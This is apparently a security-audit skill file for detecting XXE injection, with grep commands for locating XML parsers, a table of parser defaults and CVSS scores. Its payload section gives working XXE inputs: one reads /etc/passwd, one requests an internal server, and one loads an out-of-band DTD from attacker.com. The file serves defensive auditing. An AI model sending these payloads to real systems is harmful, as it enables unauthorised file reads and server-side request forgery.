---
name: xxe
description: "Detect XML External Entity injection where XML parsers process untrusted input with external entity loading enabled, allowing file read or SSRF."
metadata:
  filePattern:
    - "**/*.js"
    - "**/*.ts"
    - "**/*.py"
    - "**/*.go"
    - "**/*.rb"
    - "**/*.php"
    - "**/*.java"
  bashPattern:
    - "semgrep.*xxe"
    - "grep.*(XMLParser|DOMParser|SAXParser|DocumentBuilder)"
  priority: 80
---

# XXE Detection

## When to Use

Audit XML processing endpoints, SOAP services, document importers (DOCX/XLSX/SVG), and any code that parses XML from untrusted sources.

## Key Distinction from Entity Expansion

- **XXE** = EXTERNAL entities (`file://`, `http://`) -- reads files or makes HTTP requests
- **Entity expansion** = INTERNAL entity recursion (Billion Laughs) -- memory exhaustion DoS

Both can exist in the same parser, but they are different vulnerabilities.

## Process

### Step 1: Find XML Parsers

```
# JavaScript
grep -rn "DOMParser\|XMLParser\|xml2js\|libxmljs\|xmldom\|sax\|saxes" .

# Python
grep -rn "xml\.etree\|lxml\|minidom\|xml\.sax\|defusedxml\|xmltodict" .

# Go
grep -rn "xml\.Decoder\|xml\.Unmarshal\|encoding/xml" .

# Java
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|TransformerFactory\|SchemaFactory" .

# PHP
grep -rn "simplexml\|DOMDocument\|XMLReader\|xml_parse" .

# Ruby
grep -rn "Nokogiri\|REXML\|Ox\|LibXML" .
```

### Step 2: Check External Entity Configuration

```
grep -rn "FEATURE_SECURE_PROCESSING\|FEATURE_EXTERNAL_ENTITIES\|FEATURE_GENERAL_ENTITIES" .
grep -rn "resolve_entities\|external_entities\|load_external\|noent\|nonet" .
grep -rn "disallow-doctype-decl\|external-general-entities\|external-parameter-entities" .
grep -rn "XXE\|external.*entity\|doctype" .
```

### Step 3: Check Default Safety

Most modern parsers are SAFE by default. Key exceptions:

| Parser | Default External Entities | Safe? |
|--------|--------------------------|-------|
| xml.etree (Python) | Enabled | UNSAFE |
| xml.sax (Python) | Enabled | UNSAFE |
| lxml (Python) | Disabled | SAFE |
| defusedxml (Python) | Disabled | SAFE |
| encoding/xml (Go) | No entity support | SAFE |
| Nokogiri (Ruby) | Disabled | SAFE |
| REXML (Ruby) | Enabled | UNSAFE |
| libxml2 (C) | Depends on flags | CHECK |
| Java DocumentBuilder | Enabled | UNSAFE |
| PHP simplexml | Depends on libxml2 config | CHECK |
| PHP DOMDocument | Depends on libxml2 config | CHECK |

### Step 4: Verify User Input Reaches Parser

Does untrusted XML reach the parser? Common sources:
- File upload (XML, SVG, DOCX, XLSX)
- API request body (Content-Type: application/xml)
- Webhook payloads
- RSS/Atom feed processing
- SOAP requests

## XXE Payloads

### File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/api/secret">
]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

## CVSS Guidance

- File read (unauthenticated): HIGH 7.5
- SSRF via XXE: HIGH 7.5-8.6
- Blind XXE with OOB data exfiltration: HIGH 7.5
- Authenticated XXE: MEDIUM 6.5

## References

- [Sinks](references/sinks.md)
- [False Positive Indicators](references/false-positive-indicators.md)
- [PoC Skeleton](references/poc-skeleton.md)
